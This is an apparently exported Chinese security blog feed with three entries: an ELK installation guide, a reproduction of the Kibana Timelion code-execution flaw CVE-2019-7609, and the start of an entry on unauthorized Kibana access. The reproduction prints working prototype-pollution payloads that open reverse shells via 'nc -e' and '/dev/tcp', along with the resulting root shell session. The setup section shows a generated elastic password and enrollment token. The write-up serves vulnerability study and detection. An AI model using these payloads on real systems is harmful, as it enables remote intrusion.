title="配置数据输出到elasticsearch"></a><strong>配置数据输出到elasticsearch</strong></h5><h6 id="编辑filebeat-yml-1"><a href="#编辑filebeat-yml-1" class="headerlink" title="编辑filebeat.yml"></a>编辑filebeat.yml</h6><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dts">output.elasticsearch:<br><span class="hljs-symbol">    hosts:</span> [<span class="hljs-string">&quot;localhost:9200&quot;</span>]<br><span class="hljs-symbol">    username:</span> <span class="hljs-string">&quot;filebeat_internal&quot;</span><br><span class="hljs-symbol">    password:</span> <span class="hljs-string">&quot;YOUR_PASSWORD&quot;</span><br></code></pre></td></tr></table></figure><h4 id="启动测试"><a href="#启动测试" class="headerlink" title="启动测试"></a><strong>启动测试</strong></h4><p>sudo .&#x2F;filebeat -e -c filebeat.yml</p><h4 id="后台启动"><a href="#后台启动" class="headerlink" title="后台启动"></a><strong>后台启动</strong></h4><p>nohup .&#x2F;filebeat -c filebeat.yml &amp;</p><p>nohup .&#x2F;filebeat -c filebeat.yml &gt; &#x2F;dev&#x2F;null &amp;</p><h3 id="Elasticsearch"><a href="#Elasticsearch" class="headerlink" title="Elasticsearch"></a><strong>Elasticsearch</strong></h3><h4 id="下载安装包-1"><a href="#下载安装包-1" class="headerlink" title="下载安装包"></a><strong>下载安装包</strong></h4><p><a href="https://www.elastic.co/cn/downloads/elasticsearch">https://www.elastic.co/cn/downloads/elasticsearch</a></p><p>wget <a href="https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-8.15.2-linux-x86_64.tar.gz">https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-8.15.2-linux-x86_64.tar.gz</a></p><p>或</p><p>wget <a href="https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-6.5.3.tar.gz">https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-6.5.3.tar.gz</a></p><h4 id="验证安装包合法性"><a href="#验证安装包合法性" class="headerlink" title="验证安装包合法性"></a><strong>验证安装包合法性</strong></h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">wget</span> https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-<span class="hljs-number">8</span>.<span class="hljs-number">15</span>.<span class="hljs-number">2</span>-linux-x86_64.tar.gz.sha512<br></code></pre></td></tr></table></figure><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm">[root<span class="hljs-title">@nvm-9fsth8htsn60</span> elk]# shasum -a <span class="hljs-number">512</span> -<span class="hljs-keyword">c</span> elasticsearch<span class="hljs-number">-8.15</span>.<span class="hljs-number">2</span>-linux-<span class="hljs-keyword">x</span><span class="hljs-number">86</span>_<span class="hljs-number">64</span>.tar.gz.sha<span class="hljs-number">512</span><br>elasticsearch<span class="hljs-number">-8.15</span>.<span class="hljs-number">2</span>-linux-<span class="hljs-keyword">x</span><span class="hljs-number">86</span>_<span class="hljs-number">64</span>.tar.gz: OK<br></code></pre></td></tr></table></figure><h4 id="解压到当前目录-1"><a href="#解压到当前目录-1" class="headerlink" title="解压到当前目录"></a><strong>解压到当前目录</strong></h4><p>tar -xzf elasticsearch-8.15.2-linux-x86_64.tar.gz</p><h4 id="创建单独账号"><a href="#创建单独账号" class="headerlink" title="创建单独账号"></a><strong>创建单独账号</strong></h4><p>基于安全性要求，不要使用root账号启动服务，需要单独创建服务账号</p><p>1、useradd 创建账号</p><p>2、修改elasticsearch目录归属者为新创建账号</p><p>chown -R newuser:newuser elasticsearch目录</p><h4 id="启动测试-1"><a href="#启动测试-1" class="headerlink" title="启动测试"></a><strong>启动测试</strong></h4><p>.&#x2F;elasticsearch-8.15.2&#x2F;bin&#x2F;elasticsearch</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━<br>✅ Elasticsearch security features have been automatically configured!<br>✅ Authentication is enabled <span class="hljs-keyword">and</span> cluster connections are encrypted.<br><br>ℹ️  Password <span class="hljs-keyword">for</span> <span class="hljs-keyword">the</span> elastic user (reset <span class="hljs-keyword">with</span> `bin/elasticsearch-reset-password -u elastic`):<br>  ehpX_eJ3jK6d3EJUoVNq<br><br>ℹ️  HTTP CA certificate SHA<span class="hljs-number">-256</span> fingerprint:<br>  <span class="hljs-number">705</span>d742ec5597534189e89de35af3cff6ffe435805870bfd878879e43baa973c<br><br>ℹ️  Configure Kibana <span class="hljs-built_in">to</span> use this cluster:<br>• Run Kibana <span class="hljs-keyword">and</span> click <span class="hljs-keyword">the</span> configuration link <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> terminal when Kibana starts.<br>• Copy <span class="hljs-keyword">the</span> following enrollment <span class="hljs-keyword">token</span> <span class="hljs-keyword">and</span> paste <span class="hljs-keyword">it</span> <span class="hljs-keyword">into</span> Kibana <span class="hljs-keyword">in</span> your browser (valid <span class="hljs-keyword">for</span> <span class="hljs-keyword">the</span> next <span class="hljs-number">30</span> minutes):<br>  eyJ2ZXIiOiI4LjE0LjAiLCJhZHIiOlsiMTAuMTg1LjE2LjIzNzo5MjAwIl0sImZnciI6IjcwNWQ3NDJlYzU1OTc1MzQxODllODlkZTM1YWYzY2ZmNmZmZTQzNTgwNTg3MGJmZDg3ODg3OWU0M2JhYTk3M2MiLCJrZXkiOiI1UlFZZ0pJQkNFenJ3RG1QSHBhQTp0UWRIcFpyM1J1LTVVQnJhdjFSMV9RIn0=<br><br>ℹ️  Configure other nodes <span class="hljs-built_in">to</span> join this cluster:<br>• On this node:<br>  ⁃ Create <span class="hljs-keyword">an</span> enrollment <span class="hljs-keyword">token</span> <span class="hljs-keyword">with</span> `bin/elasticsearch-<span class="hljs-built_in">create</span>-enrollment-<span class="hljs-keyword">token</span> -s node`.<br>  ⁃ Uncomment <span class="hljs-keyword">the</span> transport.host setting <span class="hljs-keyword">at</span> <span class="hljs-keyword">the</span> <span class="hljs-function"><span class="hljs-keyword">end</span> <span class="hljs-title">of</span> <span class="hljs-title">config</span>/<span class="hljs-title">elasticsearch</span>.<span class="hljs-title">yml</span>.</span><br>  ⁃ Restart Elasticsearch.<br>• On other nodes:<br>  ⁃ Start Elasticsearch <span class="hljs-keyword">with</span> `bin/elasticsearch <span class="hljs-comment">--enrollment-token &lt;token&gt;`, using the enrollment token that you generated.</span><br>━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━<br><br></code></pre></td></tr></table></figure><p><a href="https://10.185.16.237:9200/">https://10.185.16.237:9200/</a></p><p>默认会配置</p><p><img src="/image-20241101155516281.png" alt="image-20241101155516281"></p><h4 id="查看启动进程"><a href="#查看启动进程" class="headerlink" title="查看启动进程"></a><strong>查看启动进程</strong></h4><p><strong>ps -ef | grep elasticsearch</strong></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ruby">(base) [root<span class="hljs-variable">@nvm</span>-17fuhy3puyhy0 username]<span class="hljs-comment"># ps -ef | grep elasticsearch</span><br>username <span class="hljs-number">2964458</span> <span class="hljs-number">2937096</span> <span class="hljs-number">50</span> <span class="hljs-number">16</span><span class="hljs-symbol">:</span><span class="hljs-number">48</span> pts/<span class="hljs-number">0</span>    <span class="hljs-number">00</span><span class="hljs-symbol">:</span><span class="hljs-number">00</span><span class="hljs-symbol">:</span><span class="hljs-number">27</span> /bin/java -<span class="hljs-title class_">Xms1g</span> -<span class="hljs-title class_">Xmx1g</span> -<span class="hljs-variable constant_">XX</span><span class="hljs-symbol">:+UseConcMarkSweepGC</span> -<span class="hljs-variable constant_">XX</span><span class="hljs-symbol">:CMSInitiatingOccupancyFraction=</span><span class="hljs-number">75</span> -<span class="hljs-variable constant_">XX</span><span class="hljs-symbol">:+UseCMSInitiatingOccupancyOnly</span> -<span class="hljs-variable constant_">XX</span><span class="hljs-symbol">:+AlwaysPreTouch</span> -<span class="hljs-title class_">Xss1m</span> -<span class="hljs-title class_">Djava</span>.awt.headless=<span class="hljs-literal">true</span> -<span class="hljs-title class_">Dfile</span>.encoding=<span class="hljs-variable constant_">UTF</span>-<span class="hljs-number">8</span> -<span class="hljs-title class_">Djna</span>.nosys=<span class="hljs-literal">true</span> -<span class="hljs-variable constant_">XX</span><span class="hljs-symbol">:-OmitStackTraceInFastThrow</span> -<span class="hljs-title class_">Dio</span>.netty.noUnsafe=<span class="hljs-literal">true</span> -<span class="hljs-title class_">Dio</span>.netty.noKeySetOptimization=<span class="hljs-literal">true</span> -<span class="hljs-title class_">Dio</span>.netty.recycler.maxCapacityPerThread=<span class="hljs-number">0</span> -<span class="hljs-title class_">Dlog4j</span>.shutdownHookEnabled=<span class="hljs-literal">false</span> -<span class="hljs-title class_">Dlog4j2</span>.disable.jmx=<span class="hljs-literal">true</span> -<span class="hljs-title class_">Djava</span>.io.tmpdir=<span class="hljs-regexp">/tmp/elasticsearch</span>.3YTUiprd -<span class="hljs-variable constant_">XX</span><span class="hljs-symbol">:+HeapDumpOnOutOfMemoryError</span> -<span class="hljs-variable constant_">XX</span><span class="hljs-symbol">:HeapDumpPath=data</span> -<span class="hljs-variable constant_">XX</span><span class="hljs-symbol">:ErrorFile=logs/hs_err_pid%p</span>.log -<span class="hljs-title class_">Xlog</span><span class="hljs-symbol">:gc*</span>,gc+age=trace,<span class="hljs-symbol">safepoint:</span>file=logs/gc.<span class="hljs-symbol">log:</span>utctime,pid,<span class="hljs-symbol">tags:</span>filecount=<span class="hljs-number">32</span>,filesize=64m -<span class="hljs-title class_">Djava</span>.locale.providers=<span class="hljs-variable constant_">COMPAT</span> -<span class="hljs-variable constant_">XX</span><span class="hljs-symbol">:UseAVX=</span><span class="hljs-number">2</span> -<span class="hljs-title class_">Des</span>.path.home=<span class="hljs-regexp">/opt/elk</span><span class="hljs-regexp">/es/elasticsearch</span>-<span class="hljs-number">6.5</span>.<span class="hljs-number">3</span> -<span class="hljs-title class_">Des</span>.path.conf=<span class="hljs-regexp">/opt/elk</span><span class="hljs-regexp">/es/elasticsearch</span>-<span class="hljs-number">6.5</span>.<span class="hljs-number">3</span>/config -<span class="hljs-title class_">Des</span>.distribution.flavor=default -<span class="hljs-title class_">Des</span>.distribution.type=tar -cp /opt/elk/es/elasticsearch-<span class="hljs-number">6.5</span>.<span class="hljs-number">3</span>/lib/* org.elasticsearch.bootstrap.<span class="hljs-title class_">Elasticsearch</span><br>username <span class="hljs-number">2964541</span> <span class="hljs-number">2964458</span>  <span class="hljs-number">0</span> <span class="hljs-number">16</span><span class="hljs-symbol">:</span><span class="hljs-number">48</span> pts/<span class="hljs-number">0</span>    <span class="hljs-number">00</span><span class="hljs-symbol">:</span><span class="hljs-number">00</span><span class="hljs-symbol">:</span><span class="hljs-number">00</span> /opt/elk/es/elasticsearch-<span class="hljs-number">6.5</span>.<span class="hljs-number">3</span>/modules/x-pack-ml/platform/linux-x86_64/bin/controller<br>root     <span class="hljs-number">2964660</span> <span class="hljs-number">2964585</span>  <span class="hljs-number">0</span> <span class="hljs-number">16</span><span class="hljs-symbol">:</span><span class="hljs-number">49</span> pts/<span class="hljs-number">1</span>    <span class="hljs-number">00</span><span class="hljs-symbol">:</span><span class="hljs-number">00</span><span class="hljs-symbol">:</span><span class="hljs-number">00</span> grep --color=auto elasticsearch<br></code></pre></td></tr></table></figure><p><strong>netstat -anlp | grep 9100</strong></p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs elixir">(base) [root<span class="hljs-variable">@nvm</span><span class="hljs-number">-17</span>fuhy3puyhy0 username]<span class="hljs-comment"># netstat -anlp | grep 9200</span><br>tcp6       <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-symbol">:</span><span class="hljs-number">9200</span>          ::<span class="hljs-symbol">:*</span>                    <span class="hljs-title class_">LISTEN</span>      <span class="hljs-number">2964458</span>/java<br>tcp6       <span class="hljs-number">0</span>      <span class="hljs-number">0</span> ::<span class="hljs-number">1</span><span class="hljs-symbol">:</span><span class="hljs-number">9200</span>                ::<span class="hljs-symbol">:*</span>                    <span class="hljs-title class_">LISTEN</span>      <span class="hljs-number">2964458</span>/java<br></code></pre></td></tr></table></figure><h3 id="Kibana"><a href="#Kibana" class="headerlink" title="Kibana"></a>Kibana</h3><h4 id="下载安装包-2"><a href="#下载安装包-2" class="headerlink" title="下载安装包"></a>下载安装包</h4><p><a href="https://artifacts.elastic.co/downloads/kibana/kibana-6.3.1-linux-x86_64.tar.gz">https://artifacts.elastic.co/downloads/kibana/kibana-6.3.1-linux-x86_64.tar.gz</a></p><h4 id="解压到当前目录-2"><a href="#解压到当前目录-2" class="headerlink" title="解压到当前目录"></a>解压到当前目录</h4><p>tar -zxvf kibana-6.3.1-linux-x86_64.tar.gz</p><h4 id="启动测试-2"><a href="#启动测试-2" class="headerlink" title="启动测试"></a>启动测试</h4><p>cd kibana-6.3.1-linux-x86_64&#x2F;</p><p>.&#x2F;bin&#x2F;kibana</p><p>备注：</p><p>有的默认会监听localhost，如果需要监听其他，</p><p>需要修改config&#x2F;kibana.yml，server.host 修改为其他IP</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">(base) [root@nvm<span class="hljs-number">-17</span>fuhy3puyhy0 /]<span class="hljs-comment"># netstat -anlp | grep 5601</span><br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">10.217</span><span class="hljs-number">.11</span><span class="hljs-number">.1</span>:<span class="hljs-number">5601</span>      <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:*               LISTEN      <span class="hljs-number">2965429</span>/.<span class="hljs-regexp">/bin/</span>../<span class="hljs-literal">no</span><br></code></pre></td></tr></table></figure><p>或者使用 -H 参数</p><p>.&#x2F;bin&#x2F;kibana -H 0.0.0.0</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">(base) [root@nvm<span class="hljs-number">-17</span>fuhy3puyhy0 /]<span class="hljs-comment"># netstat -anlp | grep 5601</span><br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">5601</span>            <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:*               LISTEN      <span class="hljs-number">2966531</span>/.<span class="hljs-regexp">/bin/</span>../<span class="hljs-literal">no</span><br></code></pre></td></tr></table></figure><h2 id="0x4-报错信息处理"><a href="#0x4-报错信息处理" class="headerlink" title="0x4 报错信息处理"></a><strong>0x4 报错信息处理</strong></h2><p><strong>can not run elasticsearch as root</strong></p><p>不能用root用户启动elasticsearch，单独创建账号启动</p><p>需要把elasticsearch目录归属者设置为单独创建的账号</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell">sudo chown <span class="hljs-literal">-R</span> username:username elastic<span class="hljs-built_in">search-8</span>.<span class="hljs-number">15.2</span><br>[<span class="hljs-type">username</span>@<span class="hljs-type">nvm</span>-<span class="hljs-number">9</span><span class="hljs-type">fsth8htsn60</span> <span class="hljs-type">elk</span>]<span class="hljs-variable">$</span> <span class="hljs-built_in">ls</span> <span class="hljs-literal">-ld</span> elastic<span class="hljs-built_in">search-8</span>.<span class="hljs-number">15.2</span><br>drwxr<span class="hljs-literal">-xr-x</span> <span class="hljs-number">9</span> username username <span class="hljs-number">4096</span> Sep <span class="hljs-number">19</span> <span class="hljs-number">18</span>:<span class="hljs-number">12</span> elastic<span class="hljs-built_in">search-8</span>.<span class="hljs-number">15.2</span><br></code></pre></td></tr></table></figure><h2 id="参考资源"><a href="#参考资源" class="headerlink" title="参考资源"></a>参考资源</h2><p><strong>参考链接</strong></p><p><a href="https://www.elastic.co/guide/en/beats/filebeat/current/filebeat-installation-configuration.html">https://www.elastic.co/guide/en/beats/filebeat/current/filebeat-installation-configuration.html</a></p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>secvulns</category>
      
      <category>yunweivulns</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>secvulns</tag>
      
      <tag>yunweivulns</tag>
      
      <tag>elk</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>kibana_任意代码执行_CVE-2019-7609</title>
    <link href="/2024/11/01/security/secvulns/elk/kibana_%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C_CVE-2019-7609/"/>
    <url>/2024/11/01/security/secvulns/elk/kibana_%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C_CVE-2019-7609/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="漏洞名称"><a href="#漏洞名称" class="headerlink" title="漏洞名称"></a>漏洞名称</h2><p>Elasticsearch Kibana 命令注入漏洞</p><h2 id="漏洞编号"><a href="#漏洞编号" class="headerlink" title="漏洞编号"></a>漏洞编号</h2><p>CVE-2019-7609</p><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>5.6.15和6.6.1之前的Kibana版本在Timelion可视化工具中包含任意代码执行缺陷。有权访问Timelion应用程序的攻击者可以发送将尝试执行javascript代码的请求。这可能导致攻击者在主机系统上以Kibana进程的权限执行任意命令。</p><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>Kibana versions before 5.6.15 and 6.6.1</p><p>&lt;5.6.15版本</p><p>&lt;6.6.1版本</p><h2 id="漏洞可利用性"><a href="#漏洞可利用性" class="headerlink" title="漏洞可利用性"></a>漏洞可利用性</h2><p>漏洞武器化</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h3><p>kibana 6.5.3</p><p>kibana 6.3.1默认没有Canvas模块</p><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-class">.es</span>(*)<span class="hljs-selector-class">.props</span>(<span class="hljs-selector-tag">label</span>.__proto__<span class="hljs-selector-class">.env</span>.AAAA=<span class="hljs-string">&#x27;require(&quot;child_process&quot;).exec(&quot;nc -e /bin/sh xx.xx.xx.xx 4321&quot;);process.exit()//&#x27;</span>)<span class="hljs-selector-class">.props</span>(<span class="hljs-selector-tag">label</span>.__proto__<span class="hljs-selector-class">.env</span>.NODE_OPTIONS=<span class="hljs-string">&#x27;--require /proc/self/environ&#x27;</span>)<br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-class">.es</span>(*)<span class="hljs-selector-class">.props</span>(<span class="hljs-selector-tag">label</span>.__proto__<span class="hljs-selector-class">.env</span>.AAAA=<span class="hljs-string">&#x27;require(&quot;child_process&quot;).exec(&quot;bash -i &gt;&amp; /dev/tcp/xx.xx.xx.xx/8080 0&gt;&amp;1&quot;);process.exit()//&#x27;</span>)<span class="hljs-selector-class">.props</span>(<span class="hljs-selector-tag">label</span>.__proto__<span class="hljs-selector-class">.env</span>.NODE_OPTIONS=<span class="hljs-string">&#x27;--require /proc/self/environ&#x27;</span>)<br></code></pre></td></tr></table></figure><h3 id="payload含义"><a href="#payload含义" class="headerlink" title="payload含义"></a>payload含义</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-title">.es(*)：</span><br></code></pre></td></tr></table></figure><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>Timelion模块</p><p>直接在Timelion写入playload后运行</p><p><img src="/image-20241101110418192.png" alt="image-20241101110418192"></p><p>点击左侧 <strong>Canvas</strong> 触发攻击（有时候需要等一等）</p><p>bash反弹</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs subunit">➜  20241101 nc -l 4321<br>bash: export: `/data1/miniconda3/bin&#x27;: not a valid identifier<br>(base) [root@nvm<span class="hljs-string">-17</span>fuhy3puyhy0 kibana<span class="hljs-string">-6</span>.5.3-linux-x86_64]# id<br>id<br>uid=0(root) gid=0(root) groups=0(root)<br>(base) [root@nvm<span class="hljs-string">-17</span>fuhy3puyhy0 kibana<span class="hljs-string">-6</span>.5.3-linux-x86_64]# hostname<br>hostname<br>nvm<span class="hljs-string">-17</span>fuhy3puyhy0<br>(base) [root@nvm<span class="hljs-string">-17</span>fuhy3puyhy0 kibana<span class="hljs-string">-6</span>.5.3-linux-x86_64]#<br></code></pre></td></tr></table></figure><p>nc反弹</p><p>监听不会切换bash</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br>➜  20241101 nc -l 4321<br><br><br><br><br>id<br><span class="hljs-attribute">uid</span>=0(root) <span class="hljs-attribute">gid</span>=0(root) <span class="hljs-attribute">groups</span>=0(root)<span class="hljs-built_in"></span><br><span class="hljs-built_in">ip </span>a<br>ifconifg<br>ls<br>LICENSE.txt<br>NOTICE.txt<br>README.txt<br>bin<span class="hljs-built_in"></span><br><span class="hljs-built_in">config</span><br><span class="hljs-built_in"></span>data<br>node<br>node_modules<br>optimize<br>package.json<br>plugins<br>src<br>webpackShims<br>cd /opt/elk<br>ls<br>es<br>filebeat<br>kibaba<br>kibana<br><br></code></pre></td></tr></table></figure><p>注意：</p><p>存在反弹成功一次后，就不再成功的情况，需要删除kibana，重新启动下</p><p>正常复现反弹不成功，只有kibana进行手动关闭的时候会触发，很奇怪？</p><h3 id="报错信息"><a href="#报错信息" class="headerlink" title="报错信息"></a>报错信息</h3><h4 id="Elasticsearch-index-not-found"><a href="#Elasticsearch-index-not-found" class="headerlink" title="Elasticsearch index not found"></a>Elasticsearch index not found</h4><h5 id="报错现象"><a href="#报错现象" class="headerlink" title="报错现象"></a>报错现象</h5><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-attr">[09:17:20.785]</span> <span class="hljs-selector-attr">[error]</span><span class="hljs-selector-attr">[timelion]</span> <span class="hljs-selector-tag">Error</span>: <span class="hljs-selector-tag">in</span> <span class="hljs-selector-tag">cell</span> <span class="hljs-selector-id">#1</span>: <span class="hljs-selector-tag">Elasticsearch</span> <span class="hljs-selector-tag">index</span> <span class="hljs-selector-tag">not</span> <span class="hljs-selector-tag">found</span>: <span class="hljs-selector-tag">_all</span> <br></code></pre></td></tr></table></figure><h5 id="报错原因"><a href="#报错原因" class="headerlink" title="报错原因"></a>报错原因</h5><p>没有索引导致</p><h5 id="手动或使用filebeat自动增加索引"><a href="#手动或使用filebeat自动增加索引" class="headerlink" title="手动或使用filebeat自动增加索引"></a>手动或使用filebeat自动增加索引</h5><h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>升级到最新版本</p><h2 id="漏洞入侵防护"><a href="#漏洞入侵防护" class="headerlink" title="漏洞入侵防护"></a>漏洞入侵防护</h2><p>存在 bash反弹的进程</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">(base) [root@nvm-<span class="hljs-number">17</span>fuhy3puyhy0 filebeat-<span class="hljs-number">8.15</span>.<span class="hljs-number">2</span>-linux-x86_64]<span class="hljs-comment"># ps -ef | grep bash</span><br>root     <span class="hljs-number">3003044</span>       <span class="hljs-number">1</span>  <span class="hljs-number">0</span> <span class="hljs-number">19</span>:<span class="hljs-number">11</span> pts<span class="hljs-regexp">/1    00:00:00 /</span>bin<span class="hljs-regexp">/sh -c bash -i &gt;&amp; /</span>dev<span class="hljs-regexp">/tcp/</span><span class="hljs-number">10.1</span>.<span class="hljs-number">1.1</span>/<span class="hljs-number">4321</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>     <span class="hljs-number">3036516</span>       <span class="hljs-number">1</span>  <span class="hljs-number">3</span> <span class="hljs-number">20</span>:<span class="hljs-number">10</span> pts/<span class="hljs-number">1</span>    <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> nc -e /bin/sh <span class="hljs-number">10.222.28.7</span> <span class="hljs-number">4321</span><br></code></pre></td></tr></table></figure><h2 id="参考资源"><a href="#参考资源" class="headerlink" title="参考资源"></a>参考资源</h2><p>【1】Elasticsearch Kibana 命令注入漏洞（CVE-2019-7609）</p><p><a href="https://avd.aliyun.com/detail?id=AVD-2019-7609">https://avd.aliyun.com/detail?id=AVD-2019-7609</a></p><p>【2】Elastic Stack 6.6.1 and 5.6.15 security update</p><p><a href="https://discuss.elastic.co/t/elastic-stack-6-6-1-and-5-6-15-security-update/169077">https://discuss.elastic.co/t/elastic-stack-6-6-1-and-5-6-15-security-update/169077</a></p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>secvulns</category>
      
      <category>yunweivulns</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>secvulns</tag>
      
      <tag>yunweivulns</tag>
      
      <tag>elk</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>kibana未授权访问</title>
    <link href="/2024/11/01/security/secvulns/elk/kibana%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
    <url>/2024/11/01/security/secvulns/elk/kibana%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="0x1-服务说明"><a href="#0x1-服务说明" class="headerlink" title="0x1 服务说明"></a><strong>0x1 服务说明</strong></h2><p>Kibana 是一个基于 Elasticsearch 的数据可视化和分析平台，可以对来自任何来源的任何数据进行全面透彻的分析，实现可观测性、安全和搜索。</p><p>官方网址：<a href="https://www.elastic.co/cn/kibana">https://www.elastic.co/cn/kibana</a></p><h2 id="0x2-基础信息"><a href="#0x2-基础信息" class="headerlink" title="0x2 基础信息"></a><strong>0x2 基础信息</strong></h2><p>默认端口：5601</p><p>服务信息：http</p><p>版本信息：Elasticsearch Kibana (serverName: kibana)</p><p>Title：Elastic Kibana</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">➜  /tmp nmap -<span class="hljs-variable">sV</span> <span class="hljs-number">10.182</span><span class="hljs-number">.8</span><span class="hljs-number">.138</span> -p <span 